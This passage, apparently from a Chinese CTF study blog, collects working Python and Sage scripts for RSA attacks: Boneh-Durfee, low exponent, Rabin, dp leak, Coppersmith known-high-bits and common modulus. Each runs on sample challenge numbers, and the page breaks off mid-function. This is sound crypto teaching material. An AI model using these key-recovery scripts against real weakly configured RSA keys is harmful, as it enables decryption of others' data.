class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;looking for independent vectors in the lattice&quot;</span>)<br>    found_polynomials = <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> pol1_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> pol2_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pol1_idx + <span class="hljs-number">1</span>, nn):<br>            <span class="hljs-comment"># for i and j, create the two polynomials</span><br>            PR.&lt;w,z&gt; = PolynomialRing(ZZ)<br>            pol1 = pol2 = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>                pol1 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)<br>                pol2 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)<br><br>            <span class="hljs-comment"># resultant</span><br>            PR.&lt;q&gt; = PolynomialRing(ZZ)<br>            rr = pol1.resultant(pol2)<br><br>            <span class="hljs-comment"># are these good polynomials?</span><br>            <span class="hljs-keyword">if</span> rr.is_zero() <span class="hljs-keyword">or</span> rr.monomials() == [<span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="hljs-string">&quot;and&quot;</span>, pol2_idx)<br>                found_polynomials = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found_polynomials:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_polynomials:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    rr = rr(q, q)<br><br>    <span class="hljs-comment"># solutions</span><br>    soly = rr.roots()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(soly) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Your prediction (delta) is too small&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    soly = soly[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    ss = pol1(q, soly)<br>    solx = ss.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-keyword">return</span> solx, soly<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">example</span>():</span><br>    <span class="hljs-comment">############################################</span><br>    <span class="hljs-comment"># How To Use This Script</span><br>    <span class="hljs-comment">##########################################</span><br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># The problem to solve (edit the following values)</span><br>    <span class="hljs-comment">#</span><br><br>    <span class="hljs-comment"># the modulus</span><br>    N = <span class="hljs-number">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span><br>    <span class="hljs-comment"># the public exponent</span><br>    e = <span class="hljs-number">93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973</span><br><br>    <span class="hljs-comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span><br>    delta = <span class="hljs-number">0.280</span> <span class="hljs-comment"># this means that d &lt; N^delta</span><br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># Lattice (tweak those values)</span><br>    <span class="hljs-comment">#</span><br><br>    <span class="hljs-comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span><br>    m = <span class="hljs-number">4</span> <span class="hljs-comment"># size of the lattice (bigger the better/slower)</span><br><br>    <span class="hljs-comment"># you need to be a lattice master to tweak these</span><br>    t = <span class="hljs-built_in">int</span>((<span class="hljs-number">1</span>-<span class="hljs-number">2</span>*delta) * m)  <span class="hljs-comment"># optimization from Herrmann and May</span><br>    X = <span class="hljs-number">2</span>*floor(N^delta)  <span class="hljs-comment"># this _might_ be too much</span><br>    Y = floor(N^(<span class="hljs-number">1</span>/<span class="hljs-number">2</span>))    <span class="hljs-comment"># correct if p, q are ~ same size</span><br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># Don&#x27;t touch anything below</span><br>    <span class="hljs-comment">#</span><br><br>    <span class="hljs-comment"># Problem put in equation</span><br>    P.&lt;x,y&gt; = PolynomialRing(ZZ)<br>    A = <span class="hljs-built_in">int</span>((N+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>)<br>    pol = <span class="hljs-number">1</span> + x * (A + y)<br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># Find the solutions!</span><br>    <span class="hljs-comment">#</span><br><br>    <span class="hljs-comment"># Checking bounds</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;=== checking values ===&quot;</span>)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* delta:&quot;</span>, delta)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="hljs-number">0.292</span>)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* size of e:&quot;</span>, <span class="hljs-built_in">int</span>(log(e)/log(<span class="hljs-number">2</span>)))<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* size of N:&quot;</span>, <span class="hljs-built_in">int</span>(log(N)/log(<span class="hljs-number">2</span>)))<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* m:&quot;</span>, m, <span class="hljs-string">&quot;, t:&quot;</span>, t)<br><br>    <span class="hljs-comment"># boneh_durfee</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;=== running algorithm ===&quot;</span>)<br>        start_time = time.time()<br><br>    solx, soly = boneh_durfee(pol, e, m, t, X, Y)<br><br>    <span class="hljs-comment"># found a solution?</span><br>    <span class="hljs-keyword">if</span> solx &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;=== solution found ===&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">False</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;x:&quot;</span>, solx)<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;y:&quot;</span>, soly)<br><br>        d = <span class="hljs-built_in">int</span>(pol(solx, soly) / e)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;private key found:&quot;</span>, d)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;=== no solution was found ===&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    example() <br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13781056?spm_id_from=333.999.0.0">https://www.bilibili.com/read/cv13781056?spm_id_from=333.999.0.0</a></p><hr><h2 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h2><p>e很小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">de</span>(<span class="hljs-params">c, e, n</span>):</span><br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        mm = c + n*k<br>        result, flag = gmpy2.iroot(mm, e)<br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == flag:<br>            <span class="hljs-keyword">return</span> result<br>        k += <span class="hljs-number">1</span><br>n= <span class="hljs-number">14067473525623615859223663589118945198091192669401088734569589535726733244095067264729942915265175903139441309376381225701454902095234966599914234681888481774607095853830772571665038109641511499155604914228117882196188074964226780922239011682486198651997912713999544628177959592818928976240251790858062449396082494272361535640237914373270152455829541596341184902017633404494979208958080467979235974182507427501682492000572071306960595992848840147393057648929439822116261337091431441205378542080755128597543738922210525692259529009107645032171097155449558362749512243918901171631681472217935131865121871798425854707759</span><br>e= <span class="hljs-number">3</span><br>c= <span class="hljs-number">2217344750798294937344050117513831761010547351781457575945714176628679412650463329423466955026804439931765627111856888102133234836914006818023839994342283023142702993182665344445325734299047409223354338948863171846780674244925724334091153701697864918695050507247415283070309</span><br><br>m=de(c,e,n)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)).decode()) <br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13394072?spm_id_from=333.999.0.0">https://www.bilibili.com/read/cv13394072?spm_id_from=333.999.0.0</a> </p><hr><h2 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h2><p>e一定等于2</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nix">from gmpy2 <span class="hljs-built_in">import</span> *<br><span class="hljs-built_in">import</span> libnum<br><span class="hljs-built_in">import</span> hashlib<br><span class="hljs-attr">p=275127860351348928173285174381581152299</span><br><span class="hljs-attr">q=319576316814478949870590164193048041239</span><br><span class="hljs-attr">n=87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br><span class="hljs-attr">e=2</span><br><span class="hljs-attr">c=45617141162985597041928941111553655146539175146765096976546144304138540198644</span><br><span class="hljs-attr">inv_p</span> = invert(p, q)<br><span class="hljs-attr">inv_q</span> = invert(q, p)<br><span class="hljs-attr">mp</span> = pow(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br><span class="hljs-attr">mq</span> = pow(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><span class="hljs-attr">a</span> = (inv_p * p * mq + inv_q * q * mp) % n<br><span class="hljs-attr">b</span> = n - int(a)<br><span class="hljs-attr">c</span> = (inv_p * p * mq - inv_q * q * mp) % n<br><span class="hljs-attr">d</span> = n - int(c)<br><span class="hljs-comment">#因为rabin 加密有四种结果，全部列出。</span><br><span class="hljs-attr">aa=[a,b,c,d]</span><br>for i <span class="hljs-keyword">in</span> aa:<br>    print(i)<br>    print(libnum.n2s(int(i))) <br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13467317?spm_id_from=333.999.0.0">https://www.bilibili.com/read/cv13467317?spm_id_from=333.999.0.0</a> </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nix">from Crypto.PublicKey <span class="hljs-built_in">import</span> RSA<br><span class="hljs-built_in">import</span> libnum<br><span class="hljs-built_in">import</span> gmpy2<br><span class="hljs-comment">#导入公钥</span><br><span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;pubkey.pem&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) as f:<br>    <span class="hljs-attr">key</span> = RSA.import_key(f.read())<br>    <span class="hljs-attr">n</span> =key.n<br>    <span class="hljs-attr">e</span> =key.e<br><span class="hljs-comment">#导入密文</span><br><span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) as f:<br>    <span class="hljs-attr">c=libnum.s2n(f.read())</span><br><br>print(n)<br>print(e)<br><span class="hljs-comment">#n 在线分解</span><br><span class="hljs-attr">p=275127860351348928173285174381581152299</span><br><span class="hljs-attr">q=319576316814478949870590164193048041239</span><br><span class="hljs-attr">inv_p</span> = gmpy2.invert(p, q)<br><span class="hljs-attr">inv_q</span> = gmpy2.invert(q, p)<br><span class="hljs-attr">mp</span> = pow(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br><span class="hljs-attr">mq</span> = pow(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><span class="hljs-attr">a</span> = (inv_p * p * mq + inv_q * q * mp) % n<br><span class="hljs-attr">b</span> = n - int(a)<br><span class="hljs-attr">c</span> = (inv_p * p * mq - inv_q * q * mp) % n<br><span class="hljs-attr">d</span> = n - int(c)<br><span class="hljs-comment">#因为rabin 加密有四种结果，全部列出。</span><br><span class="hljs-attr">aa=[a,b,c,d]</span><br>for i <span class="hljs-keyword">in</span> aa:<br>    <span class="hljs-comment"># print(i)</span><br>    print(libnum.n2s(int(i))) <br></code></pre></td></tr></table></figure><p><a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_e_attack/">公钥指数相关攻击 - CTF Wiki (ctf-wiki.org)</a></p><hr><h2 id="当e和phi不互素"><a href="#当e和phi不互素" class="headerlink" title="当e和phi不互素"></a>当e和phi不互素</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">x = gmpy2.gcd(phi, e)<br>d = gmpy2.invert(e // x, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = gmpy2.iroot(m, x)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(flag)))<br></code></pre></td></tr></table></figure><hr><h2 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br>dp = <span class="hljs-number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br>c = <span class="hljs-number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65535</span>):<br>    p=(dp*e-<span class="hljs-number">1</span>)//i+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> n%p==<span class="hljs-number">0</span>:<br>        q=n//p<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br>phi_n= (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi_n)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(m)<br>flag=libnum.n2s(<span class="hljs-built_in">int</span>(m)).decode()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><hr><h2 id="N由多素数组成且素数带有次方"><a href="#N由多素数组成且素数带有次方" class="headerlink" title="N由多素数组成且素数带有次方"></a>N由多素数组成且素数带有次方</h2><p><code>N=p**2*q**3*r**5*t**7*</code><br><code>phi=(p-1)*p*q**2*(q-1)*r**4*(r-1)*t**6*(t-1)</code><br>其他没有变化，正常计算即可</p><hr><h2 id="已知dp、dq、p、q、c"><a href="#已知dp、dq、p、q、c" class="headerlink" title="已知dp、dq、p、q、c"></a>已知dp、dq、p、q、c</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">dp,dq,p,q,c</span>):</span><br>    InvQ = gmpy2.invert(q, p)<br>    mp = <span class="hljs-built_in">pow</span>(c, dp, p)<br>    mq = <span class="hljs-built_in">pow</span>(c, dq, q)<br>    m = (((mp-mq)*InvQ) % p)*q+mq<br>    <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)).decode())<br><br>dp=<span class="hljs-number">5052882267944459896063942392534379448810718093348381758286781811719311663310063302173760032982142586285079042828546912467138475161693026139283139414185935</span><br>dq=<span class="hljs-number">8778400270622276402687979905385226435600717274058228963159983444750011003782436556279419782403013228295325114848834289405247546524131313104685306273705481</span><br>c=<span class="hljs-number">126532907580099364343184491768646529625198629422625132086837277388311620436342303548372778988466885452676106624249993145364094931515804016688045515844551913407187806695920008237063017356722982532180950578657415816037585713774844783414877587745164572907604833861956805820826575330755221423176730512522016231899</span><br>p=<span class="hljs-number">12703830329315842567550642290233844551989413115578044857207995534378659933185699107475417626944054884619067220234567806128777927903935084746622131729293883</span><br>q=<span class="hljs-number">13227646254242570726391882350245593196835449566365947429669506242811060886921793037704557843316080241482324099322834773980909766089991351871376104597517673</span><br><br><br>decrypt(dp,dq,p,q,c)<br></code></pre></td></tr></table></figure><hr><h2 id="m高位攻击"><a href="#m高位攻击" class="headerlink" title="m高位攻击"></a>m高位攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sage">import libnum<br>def phase2(high_m, n, c):<br>    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=&#x27;NTL&#x27;)<br>    m = high_m + x<br>    M = m((m^3 - c).small_roots()[0])<br>    print(libnum.n2s(int(M)))<br><br>n= 16375911057984467860173028499662793813198989070891462046702689271326139635781678292779095962528585009670015786235494254339716198163498114440710970519760731615457538963588012609421435357625310123852269659556877780556282784378911243624799312161395869291700339099744622787092292212808041739935363726641015733082591519285930439717736591210957039387077203590963514630879038078615201950805057733038622070074246926048776699133348654093003217709061073510046710565744672093957004519016895478465918909294337641778357708633353664132944153092793959582685432330892190960961439661225639169934805918097911051922729785720701933534021<br>e= 3<br>c= 175676150266403934024028881165956357569100114594293998449367661494592439256350774016927790942005197030835672661768700955232102741828268826317608643103085037913845664530507219457425306700667637263739558920826441431873842792152100711788904901597274447160613809337879563457097769364821425046114008763402341<br>high_m= 56006392793404656900162277604003911130977996870658599363889243117614813715239971694356275604343488512<br><br>phase2(high_m, n, c) <br></code></pre></td></tr></table></figure><hr><h2 id="p高位攻击"><a href="#p高位攻击" class="headerlink" title="p高位攻击"></a>p高位攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sage"><br><br>def phase3(high_p, n):<br>    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=&#x27;NTL&#x27;)<br>    p = high_p + x<br>    x0 = p.small_roots(X = 2^60, beta = 0.1)[0]<br><br>    P = int(p(x0))<br>    Q = n // P<br>    print(&#x27;p=&#x27;+str(P))<br>    print(&#x27;q=&#x27;+str(Q))<br>    assert n == P*Q<br><br><br>n=71175964479820590196848206107457327773315432415434453675314012424322432254515417738949878162881094869716876604585411320034080384957472263356097541370946962740975900107459650767873353985451905759740076012563517056996786632286930555557338225641760207807335781013578983226050609963293210018112831999179270189311<br>c=18105190752099650953130470796914136696510373965800409029646970798857030739727349901748502043281854034802228984535317214219994808930782000992301001478330776033469798930060334281987484430401944150830855804108526454289628245759405249752545254405447843090288865608024559027337089138160515255301895121112198062310<br>e= 65537<br>p1=7943800264190857561504634065906589074541057897301212474051150720585291471607774299951887925114669229462076831147822029473407995208749410004104204384926633<br><br>phase3(p1, n) <br></code></pre></td></tr></table></figure><hr><h2 id="e1、e2不互素的共模攻击（已知e1-e2的共模攻击）"><a href="#e1、e2不互素的共模攻击（已知e1-e2的共模攻击）" class="headerlink" title="e1、e2不互素的共模攻击（已知e1*e2的共模攻击）"></a>e1、e2不互素的共模攻击（已知e1*e2的共模攻击）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">e1= <span class="hljs-number">221</span><br>e2= <span class="hljs-number">299</span><br>n= <span class="hljs-number">22752951745297736168537377055274778116665470909065477125935886705065315928343909239030226134317655286811706825307791028935468695248938314873728310939010332033303049984284854672480419186656651898284247010047681096246455201967436493619623922813042286133760359535974396266228677845061471522291462170675019300170320671686114928795841399272659671749295028598451924716935439876301262667477640877837569951118311739219264913187243646073550492683492113343384821975066291244933858116486782731928931431642274809491405001955412026149194699922670378380172100475024897567223023327826339547555266975263552287361838466410256332586243602018701252181095544525087725089471855146785890801898964498900490722824136161536824524023843219008916078446694933471093288073098317841217353433648382906362253310187885031349173752969974195099147758139669961092400692293113078059473080806234076443570119722130939533645583942861471571301658146374104930923161280707107854937882275460478198823125819905477560849933589115721416285687345303919348351291800712956242809906173781232818857076129195419972616950359257381023984782648862051425193061029177411755248884275122634206055064928918131704555281055171016232989653908936425333474592396425262724183978715755517681781896905505681019433680152515179578293854352466356161898967395639133527374169311595381</span><br>c1= <span class="hljs-number">10892593793227365116925700965458364184649125396663943796073539260980997644891965799450399424218723107551158558465723957982810191916064316067402569229239706110587662283006062233207602849048977390414725491999094784268795765845090278541345060691227848049341792356361866090107794846740587550516493827550761044916120742634716100959568752284205773635157016570644732882618112667602892495591343383196825341503584074765200031063900399784671363062540083853968276812461259424786023596109476654103941796084022234777516856935201686089014703949873963763173504178597282120893681944701529635472087336308148045296570250358965387578639389647372863697874387920284376355175371658214022432637233049643918240215883756536156344271717888814377311625833162569949367074856096858774042469897229733611875690829200986478219874772214075323186921718101279851215225427651429974497218901117181173977981895145545289488897144837754206327890077498892642359817562974797240756164341335703875164746037528216084897204167262772966756903307518956994642174111291907559634725813349461899233834828219448501415166737945826263270661137588163692728905410221169466525723870303978092494941639719863782656186969513167917612386960116158336850718448480833247082725651743364206989720150402475518960807596933665261898347257015381952076956414926169065628402035877024</span><br>c2= <span class="hljs-number">16234449136110301948915044033782803178888320780730248041362289400402520359200135207779437601300318341574596537693496447844160745059083759235870748096444629141498803084865475060123420097840970184733706276824699107779327930269426809903826537911640592522293558467627053309463726380481516500764543325038595504462274814965367972343969703518441786374346751491786697266008897789281988633961789937331687231107598075641627085598476591935681238873469342798684028977952673061492319474370639867032312696974209893993745844085661037025325712464003345130349368517370647831842069123305455497561422546383131187398775555886803281812066994566108824332556193714585778964779070971454065665303736272711223551782164863853905352227680603140162402255969282233812006972796280850233545219871869909534783019159100014111451843232957211373061429434617954249240688081192808501611525220067662230418353538193891708132134012043837396576358357488762683942703800181858824520755919230602612335238556205420378498803006965524284284802224595940916712846360900844939206346374912066944666599066191687022350969781809803220970991254223987034473812934155305370148168751311003191110608399854183137132450387729417275410039697670774601121758536584269746197227045293026303760774202258533200041885054449850059983037919760683276465377311443445828203784214390883</span><br><br>e1e2 = e1*e2<br><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsa_gong_N_def</span>(<span class="hljs-params">e1, e2, c1, c2, n</span>):</span>  <span class="hljs-comment"># 共模攻击函数</span><br>    e1, e2, c1, c2, n = <span class="hljs-built_in">int</span>(e1), <span class="hljs-built_in">int</span>(e2), <span class="hljs-built_in">int</span>(c1), <span class="hljs-built_in">int</span>(c2), <span class="hljs-built_in">int</span>(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e1,e2:&quot;</span>, e1, e2)<br>    s = gmpy2.gcdext(e1, e2)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mpz:&quot;</span>, s)<br>    s1 = s[<span class="hljs-number">1</span>]<br>    s2 = s[<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">if</span> s1 &lt; <span class="hljs-number">0</span>:<br>        s1 = - s1<br>        c1 = gmpy2.invert(c1, n)<br>    <span class="hljs-keyword">elif</span> s2 &lt; <span class="hljs-number">0</span>:<br>        s2 = - s2<br>        c2 = gmpy2.invert(c2, n)<br>    m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">de</span>(<span class="hljs-params">c, e, n</span>):</span>  <span class="hljs-comment"># 因为此时的m不是真正的m，而是m^k，所以对m^k进行爆破</span><br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> k &lt; <span class="hljs-number">1000</span>:  <span class="hljs-comment"># 指定k小于1000</span><br>        mk = c + n * k<br>        flag, true1 = gmpy2.iroot(mk, e)  <span class="hljs-comment"># 